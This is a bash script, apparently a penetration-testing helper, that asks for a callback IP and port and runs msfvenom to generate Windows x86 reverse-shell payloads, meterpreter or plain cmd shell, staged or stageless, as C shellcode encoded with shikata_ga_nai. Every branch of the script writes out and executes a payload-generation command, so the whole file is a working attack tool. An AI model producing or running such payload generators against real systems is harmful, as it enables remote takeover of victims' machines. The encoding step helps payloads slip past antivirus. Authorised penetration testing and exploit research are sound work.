#!/bin/bash
set -e
cat << "EOF"
                 _.-;;-._
          '-..-'|   ||   |
          '-..-'|_.-;;-._|
          '-..-'|   ||   |
          '-..-'|_.-''-._|   
EOF
echo
echo Shell Generator By Netanel Shoshan.
echo
echo Would you like to auto generate a reverse shell with msfvenom? \(Y\/n\)
read genMSF
if [[ $genMSF =~ [yY](es)* ]]
then
    echo LHOST for reverse connection:
    read ip
    echo LPORT you want x86 to listen on:
    read port
    echo Type 0 to generate a meterpreter shell or 1 to generate a regular cmd shell
    read cmd
    if [[ $cmd -eq 0 ]]
    then
        echo Type 0 to generate a staged payload or 1 to generate a stageless payload
        read cmd
        if [[ $cmd -eq 0 ]]
        then
            echo Generating x86 meterpreter shell \(staged\)...
            echo
            echo msfvenom -p windows/meterpreter/reverse_tcp -f c -e x86/shikata_ga_nai EXITFUNC=thread LHOST=$ip LPORT=$port
            msfvenom -p windows/meterpreter/reverse_tcp -f c -e x86/shikata_ga_nai EXITFUNC=thread LHOST=$ip LPORT=$port
        elif [[ $cmd -eq 1 ]]
        then
            echo Generating x86 meterpreter shell \(stageless\)...
            echo
            echo msfvenom -p windows/meterpreter_reverse_tcp -f c -e x86/shikata_ga_nai EXITFUNC=thread LHOST=$ip LPORT=$port
            msfvenom -p windows/meterpreter_reverse_tcp -f c -e x86/shikata_ga_nai EXITFUNC=thread LHOST=$ip LPORT=$port

        else
            echo Invalid option...exiting...
            exit 1
        fi
    elif [[ $cmd -eq 1 ]]
    then
        echo Type 0 to generate a staged payload or 1 to generate a stageless payload
        read cmd
        if [[ $cmd -eq 0 ]]
        then
            echo Generating x86 cmd shell \(staged\)...
            echo
            echo msfvenom -p windows/shell/reverse_tcp -f c -e x86/shikata_ga_nai EXITFUNC=thread LHOST=$ip LPORT=$port
            msfvenom -p windows/shell/reverse_tcp -f c -e x86/shikata_ga_nai EXITFUNC=thread LHOST=$ip LPORT=$port
        elif [[ $cmd -eq 1 ]]
        then
            echo Generating x86 cmd shell \(stageless\)...
            echo
            echo msfvenom -p windows/shell_reverse_tcp -f c -e x86/shikata_ga_nai EXITFUNC=thread LHOST=$ip LPORT=$port
            msfvenom -p windows/shell_reverse_tcp -f c -e x86/shikata_ga_nai EXITFUNC=thread LHOST=$ip LPORT=$port
        else
            echo Invalid option...exiting...
            exit 1
        fi
    else
        echo Invalid option...exiting...
        exit 1
    fi
else
    echo Okay cool, make sure you you do in on your own :\)
    sleep 1
    echo bye..
    sleep 1	
fi

exit 0

